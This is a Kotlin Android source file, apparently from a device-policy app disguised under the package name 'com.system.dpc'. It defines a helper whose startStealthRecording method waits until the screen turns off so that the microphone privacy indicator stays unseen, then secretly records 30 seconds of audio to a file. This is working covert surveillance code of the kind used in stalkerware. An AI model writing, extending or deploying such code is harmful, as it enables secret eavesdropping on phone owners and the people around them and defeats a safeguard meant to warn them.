package com.system.dpc

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.media.MediaRecorder
import android.os.Build
import android.os.PowerManager
import android.util.Log
import kotlinx.coroutines.*
import java.io.File
import java.io.IOException

class AudioCaptureHelper(private val context: Context) {

    private var mediaRecorder: MediaRecorder? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    interface AudioCaptureCallback {
        fun onCaptureComplete(file: File)
        fun onCaptureError(error: String)
    }

    fun startStealthRecording(outputFile: File, callback: AudioCaptureCallback) {
        val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        
        if (powerManager.isInteractive) {
            // Screen is ON: Wait for Screen OFF to avoid the green mic indicator visibility
            val filter = IntentFilter(Intent.ACTION_SCREEN_OFF)
            val receiver = object : BroadcastReceiver() {
                override fun onReceive(context: Context, intent: Intent) {
                    context.unregisterReceiver(this)
                    executeRecording(outputFile, callback)
                }
            }
            context.registerReceiver(receiver, filter)
        } else {
            // Screen is already OFF: Proceed immediately
            executeRecording(outputFile, callback)
        }
    }

    private fun executeRecording(outputFile: File, callback: AudioCaptureCallback) {
        scope.launch {
            try {
                initRecorder(outputFile)
                mediaRecorder?.start()
                
                // Record for exactly 30 seconds
                delay(30000)
                
                stopAndRelease()
                withContext(Dispatchers.Main) {
                    callback.onCaptureComplete(outputFile)
                }
            } catch (e: Exception) {
                stopAndRelease()
                withContext(Dispatchers.Main) {
                    callback.onCaptureError(e.message ?: "Unknown recording error")
                }
            }
        }
    }

    private fun initRecorder(file: File) {
        mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(context)
        } else {
            @Suppress("DEPRECATION")
            MediaRecorder()
        }.apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setAudioSamplingRate(44100)
            setAudioEncodingBitRate(96000)
            setOutputFile(file.absolutePath)
            prepare()
        }
    }

    private fun stopAndRelease() {
        try {
            mediaRecorder?.apply {
                stop()
                reset()
                release()
            }
        } catch (e: Exception) {
            Log.e("AudioCaptureHelper", "Error stopping recorder: ${e.message}")
        } finally {
            mediaRecorder = null
        }
    }
}